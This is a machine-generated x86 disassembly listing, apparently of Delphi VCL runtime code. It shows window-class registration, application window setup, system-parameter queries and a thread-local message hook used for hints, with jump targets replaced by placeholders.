add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_466818
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_466954 ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_4669c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_466120
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_418310
mov dl [ ebp - 0x1 ]
call sub_466818
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_46610c
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4181b4
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_41838c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_418310
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_4667b8
test al al
je r-xdata
inc esi
sub_466b14
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_466120
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_46610c
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_466b6c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_466b14
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_466be6
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_4669c8
pop ecx
push ebp
mov al 0x2
call sub_4669c8
pop ecx
push ebp
mov al 0x3
call sub_4669c8
pop ecx
push ebp
mov al 0x4
call sub_4669c8
pop ecx
push ebp
mov al 0x5
call sub_4669c8
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403290
retn
sub_466bf4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_466788
xor eax eax
push ebp
push sub_466c6d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_466b6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_466790
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_466c88
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_404008
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_40405c
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_466ce0
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push j_sub_403758#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_46912c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_466d34
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_44736c
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_4691a8
sub_466d90
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_468248
sub_466dd4
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_466d90
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_466d34
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_466e48
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_466ea4
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_466ed4
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_466efc
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_466ea4
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_466ed4
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_466ed4
sub_466f3c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420714
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_468614
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_42883c
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_428c0c
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_468dac
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40c4cc
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46880c
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40c4f4
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_408674
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_404278
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_468f88
mov eax ebx
call sub_46994c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_467244
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_467125
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_403644
mov ebx edx
mov esi eax
mov eax esi
call sub_46995c
mov [ esp + 0x4 ] esi
mov [ esp ] sub_468614
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_46880c
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_4691a8
xor edx edx
mov eax esi
call sub_468b24
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420760
push esi
push sub_467678
mov eax esi
call sub_468400
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_405874
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_403290
mov eax [ esi + 0x90 ]
call sub_403290
mov eax [ esi + 0x98 ]
call sub_403290
test bl bl
jle r-xdata
call sub_42183c
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_467244
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4673e5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4673ec
lea eax [ ebp - 0x2c ]
call sub_404008
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_4677c4
call sub_4217a4
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_4044c8
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_406be8
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_404008
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_467ec8
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_467ec8
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_4673f4
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_466128
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_467454
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_4181b4
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_44f2dc
cmp ebx eax
je r-xdata
sub_4674c4
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_467454
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_418310
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_4675dc
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_418310
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_467678
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40c794
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_466634
mov eax [ rw-data ]
call sub_466c7c
sub_4676d0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46772d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467734
lea eax [ ebp - 0x4 ]
call sub_404008
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_404200
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_46773c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_467778
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_467ec8
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_4677c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push j_sub_403758#2
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_467678
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_4688e4
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_418310
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_44f2dc
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_469810
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_468400
jmp r-xdata
